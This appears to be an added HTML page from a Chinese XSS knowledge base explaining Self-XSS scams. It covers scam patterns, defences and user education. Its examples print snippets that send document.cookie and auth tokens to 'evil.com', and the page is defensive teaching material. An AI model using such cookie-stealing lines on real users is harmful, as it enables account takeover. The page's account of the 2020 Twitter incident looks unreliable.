@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    
+<meta name="description" content="Self-XSS社会工程学攻击案例深度分析，包括攻击手法、真实案例、防御策略、用户教育等完整安全知识。">
+<meta name="keywords" content="Self-XSS,社会工程学,钓鱼攻击,浏览器控制台,安全意识,用户教育">
+<title>Self-XSS社会工程学攻击案例分析 - XSS安全知识库</title>
+<link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet"><link href="../static/libs/fontawesome/css/all.min.css" rel="stylesheet"><link href="../static/css/style.css" rel="stylesheet"><link href="../static/libs/prism/css/prism-tomorrow.min.css" rel="stylesheet">
+<style>.header{background:linear-gradient(135deg,#1a1a2e,#16213e);padding:3rem 0;border-bottom:2px solid #00ff41}.content{max-width:900px;margin:2rem auto;padding:2rem;background:rgba(0,0,0,0.3);border-radius:8px}h2{color:#00ff41;margin-top:2.5rem;padding-bottom:0.5rem;border-bottom:2px solid rgba(0,255,65,0.3)}pre{background:rgba(0,0,0,0.5);padding:1.5rem;border-radius:8px;border-left:3px solid #00ff41}.danger{background:rgba(220,53,69,0.1);border-left:4px solid #dc3545;padding:1rem;margin:1.5rem 0}.tip{background:rgba(0,123,255,0.1);border-left:4px solid #007bff;padding:1rem;margin:1.5rem 0}        
+        /* 鍥炲埌椤堕儴鎸夐挳 */
+        .back-to-top {
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            width: 50px;
+            height: 50px;
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .back-to-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5);
+        }
+        
+        .back-to-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+<div class="container"><nav aria-label="breadcrumb"><ol class="breadcrumb" style="background:transparent;padding:1rem 0"><li class="breadcrumb-item"><a href="../index.html" style="color:#00ff41">首页</a></li><li class="breadcrumb-item"><a href="../wiki.html" style="color:#00ff41">知识库</a></li><li class="breadcrumb-item active">Self-XSS攻击</li></ol></nav></div>
+<div class="header"><div class="container text-center"><h1 style="font-size:2.5rem;color:#fff"><i class="fas fa-user-secret"></i> Self-XSS社会工程学攻击案例分析</h1><div style="color:#999">16分钟阅读 | 高级技巧</div></div></div>
+<div class="container"><div class="content" style="color:#ccc;line-height:1.8">
+
+<h2><i class="fas fa-question-circle"></i> 一、什么是Self-XSS</h2>
+<p>Self-XSS（自攻击XSS）是指攻击者通过社会工程学手段，诱骗受害者自己在浏览器控制台或地址栏中执行恶意JavaScript代码。</p>
+
+<div class="danger"><h4><i class="fas fa-exclamation-triangle"></i> 关键特征</h4>
+<p>• 需要受害者主动配合<br>
+• 不是技术漏洞，而是人为失误<br>
+• 危害性取决于用户权限<br>
+• 传统技术防御措施无效</p></div>
+
+<h3>1.1 与传统XSS的区别</h3>
+<ul><li><strong>传统XSS</strong>：利用应用程序漏洞自动执行</li><li><strong>Self-XSS</strong>：需要诱骗用户手动执行</li><li><strong>影响范围</strong>：Self-XSS只影响执行者本人</li><li><strong>漏洞性质</strong>：Self-XSS不被视为安全漏洞</li></ul>
+
+<h2><i class="fas fa-user-secret"></i> 二、常见攻击手法</h2>
+
+<h3>2.1 浏览器控制台骗局</h3>
+<p>最常见的Self-XSS攻击形式：</p>
+<pre><code class="language-javascript">// 攻击者发布的"教程"
+"⚠️ 紧急！检测到账号异常！
+请立即在浏览器按F12，粘贴以下代码：
+
+fetch('https://api.example.com/verify', {
+  method: 'POST',
+  body: JSON.stringify({
+    token: document.cookie,
+    user: '您的用户名'
+  })
+});
+
+执行后账号将恢复正常！"</code></pre>
+
+<h3>2.2 "免费会员"骗局</h3>
+<pre><code class="language-javascript">// 伪装成赠送会员的代码
+"🎉 限时福利！免费获得VIP会员！
+复制下方代码到控制台：
+
+fetch('/api/upgrade', {
+  method: 'POST', 
+  headers: {'X-Auth': document.cookie}
+}).then(r => r.json()).then(d => alert('恭喜获得VIP！'));
+
+// 实际上窃取Cookie并发送到攻击者服务器"</code></pre>
+
+<h3>2.3 "隐藏功能"骗局</h3>
+<pre><code class="language-javascript">// 声称可以解锁隐藏功能
+"🔓 解锁隐藏功能：查看谁浏览了你的主页！
+打开控制台（F12），粘贴：
+
+(function(){
+  var data = {
+    cookie: document.cookie,
+    tokens: localStorage.getItem('auth_token')
+  };
+  fetch('https://evil.com/steal', {
+    method: 'POST',
+    body: JSON.stringify(data)
+  });
+  alert('功能已激活！刷新页面查看！');
+})();"</code></pre>
+
+<h3>2.4 技术支持诈骗</h3>
+<pre><code class="language-markup">// 伪装成客服的指导
+"您好！我是客服小王。
+检测到您的账户出现异常登录。
+请配合安全验证：
+
+1. 按F12打开开发者工具
+2. 点击'Console'标签
+3. 粘贴以下验证码：
+   document.location='https://evil.com?c='+document.cookie
+4. 按回车键
+
+验证完成后账户将解除异常状态。"</code></pre>
+
+<h2><i class="fas fa-bullseye"></i> 三、真实案例分析</h2>
+
+<h3>3.1 Facebook "自我XSS"警告</h3>
+<p>Facebook在控制台显示醒目警告：</p>
+<pre><code class="language-javascript">// Facebook控制台显示
+%c停下！
+%c这是专为开发者提供的浏览器功能。
+如果有人告诉您在此处复制粘贴内容以启用Facebook功能或"黑入"某人的账户，
+那是骗局，会让他们访问您的Facebook账户。
+
+color: red; font-size: 50px; font-weight: bold;</code></pre>
+
+<h3>3.2 Twitter账号劫持事件</h3>
+<p>2020年，攻击者通过社会工程学诱骗Twitter员工执行恶意代码，导致多个高价值账户被劫持。</p>
+
+<h3>3.3 游戏平台诈骗</h3>
+<p>攻击者在游戏论坛发布"外挂教程"，实际是窃取游戏账户的Self-XSS代码。</p>
+
+<h2><i class="fas fa-shield-alt"></i> 四、防御措施</h2>
+
+<h3>4.1 浏览器层面防护</h3>
+<p>现代浏览器的保护机制：</p>
+<pre><code class="language-javascript">// Chrome/Edge在控制台显示警告
+console.log('%c⚠️ 警告', 'font-size: 30px; color: red;');
+console.log('粘贴未知代码可能导致账户被盗！');
+console.log('除非您完全理解代码内容，否则不要执行！');
+
+// Firefox类似警告
+console.warn('请小心使用控制台！');</code></pre>
+
+<h3>4.2 应用层面防护</h3>
+<p>网站可采取的措施：</p>
+<ul><li>在控制台显示警告信息</li><li>检测控制台打开行为并提示用户</li><li>对敏感操作增加二次验证</li><li>监控异常API调用</li></ul>
+
+<pre><code class="language-javascript">// 检测控制台是否打开
+var devtools = {
+  isOpen: false,
+  orientation: null
+};
+
+var threshold = 160;
+var emitEvent = function(state) {
+  window.dispatchEvent(new CustomEvent('devtoolschange', {
+    detail: { isOpen: state }
+  }));
+};
+
+setInterval(function() {
+  if (window.outerWidth - window.innerWidth > threshold ||
+      window.outerHeight - window.innerHeight > threshold) {
+    if (!devtools.isOpen) {
+      emitEvent(true);
+      alert('⚠️ 警告：检测到开发者工具已打开！\n请勿执行任何未知代码！');
+    }
+    devtools.isOpen = true;
+  } else {
+    if (devtools.isOpen) {
+      emitEvent(false);
+    }
+    devtools.isOpen = false;
+  }
+}, 500);</code></pre>
+
+<h3>4.3 用户教育</h3>
+<p>最有效的防御是提升用户安全意识：</p>
+<ul><li>永远不要在控制台执行别人提供的代码</li><li>不要相信"免费会员"、"隐藏功能"等诱惑</li><li>真实的客服不会要求您执行代码</li><li>学习基本的Web安全知识</li></ul>
+
+<h2><i class="fas fa-graduation-cap"></i> 五、安全意识培训</h2>
+
+<h3>5.1 识别Self-XSS的特征</h3>
+<div class="tip"><h4><i class="fas fa-lightbulb"></i> 警惕信号</h4>
+<p>✗ 要求打开F12或开发者工具<br>
+✗ 要求复制粘贴代码到控制台<br>
+✗ 承诺免费获得付费功能<br>
+✗ 声称可以解锁隐藏功能<br>
+✗ 紧急要求立即操作<br>
+✗ 来自非官方渠道的"技术支持"</p></div>
+
+<h3>5.2 正确的应对方式</h3>
+<ol><li>拒绝执行任何未知代码</li><li>向官方渠道核实信息真伪</li><li>截图保存证据并举报</li><li>提醒周围的人注意防范</li><li>修改账户密码（如已执行）</li></ol>
+
+<h2><i class="fas fa-bug"></i> 六、Self-XSS的局限性</h2>
+<p>为什么Self-XSS不被视为安全漏洞：</p>
+<ul><li><strong>需要主动配合</strong>：无法自动化攻击</li><li><strong>影响有限</strong>：只影响执行者自己</li><li><strong>技术无关</strong>：属于社会工程学范畴</li><li><strong>无法修复</strong>：无法通过代码补丁防御</li></ul>
+
+<h2><i class="fas fa-book"></i> 七、总结</h2>
+<p>Self-XSS虽不是技术漏洞，但危害不容忽视：</p>
+<ol><li>本质是社会工程学攻击</li><li>利用用户的信任和好奇心</li><li>技术防御措施有限</li><li>用户教育是关键</li><li>企业应重视安全意识培训</li></ol>
+
+<div class="danger"><h4><i class="fas fa-ban"></i> 牢记原则</h4>
+<p><strong>永远不要在浏览器控制台中执行不理解的代码！</strong><br>
+即使是朋友发送的，也要保持警惕。</p></div>
+
+<h2><i class="fas fa-link"></i> 相关资源</h2>
+<ul><li>Facebook安全中心：Self-XSS警告</li><li>OWASP：社会工程学防御指南</li><li>Google安全博客：浏览器控制台安全</li></ul>
+
+<div style="display:flex;justify-content:space-between;margin-top:3rem;padding-top:2rem;border-top:1px solid #333">
+<a href="keylogger.html" style="color:#00ff41;text-decoration:none"><i class="fas fa-arrow-left"></i> 上一篇：键盘记录器</a>
+<a href="../wiki.html" style="color:#00ff41;text-decoration:none">返回知识库 <i class="fas fa-home"></i></a>
+<a href="xss-introduction.html" style="color:#00ff41;text-decoration:none">回到第一篇 <i class="fas fa-redo"></i></a>
+</div>
+
+</div></div>
+<footer class="footer"><div class="container-fluid"><div style="text-align:center;color:#999;padding:2rem 0">
+<p>© 2025 蓝莲花XSS在线平台 | 知识库共12篇文章</p>
+<p style="font-size:0.9rem;margin-top:0.5rem">仅用于授权的安全研究和渗透测试 | 请遵守法律法规</p>
+<a href="../index.html" style="color:#00ff41;text-decoration:none">返回首页</a>
+</div></div></footer>    
+    <!-- 鍥炲埌椤堕儴鎸夐挳 -->
+    <button class="back-to-top" id="backToTop">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+    
+<script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+<script src="../static/libs/prism/js/prism.min.js"></script>
+<script>console.log('%c⚠️ 停止！','color:red;font-size:50px;font-weight:bold');console.log('%c这是浏览器开发者功能。\n如果有人告诉你复制粘贴代码到这里，\n那是诈骗行为，会导致账户被盗！','font-size:18px');</script>    <script>
+        // 鍥炲埌椤堕儴鍔熻兘
+        const backToTopBtn = document.getElementById('backToTop');
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('show');
+            } else {
+                backToTopBtn.classList.remove('show');
+            }
+        });
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    </script>
+</body></html>
